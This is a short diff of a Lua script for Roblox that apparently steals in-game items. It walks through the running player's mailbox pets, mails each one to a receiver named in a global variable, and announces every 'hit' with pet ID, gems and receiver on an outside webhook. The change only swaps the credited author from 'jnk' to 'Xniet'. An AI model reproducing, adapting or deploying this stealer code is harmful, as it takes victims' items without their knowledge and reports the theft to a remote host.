@@ -249,11 +249,11 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                     ["Pets"] = {
                         [1] = v.Name
                     },
-                    ["Message"] = "made by jnk"
+                    ["Message"] = "made by Xniet"
                 }
             }
         SendMail:InvokeServer(unpack(args))
-        sendWebhook(_G.Webhook, "@everyone jnk detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
+        sendWebhook(_G.Webhook, "@everyone Xniet detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "```")
         dims = 0
         wait(4)
     end
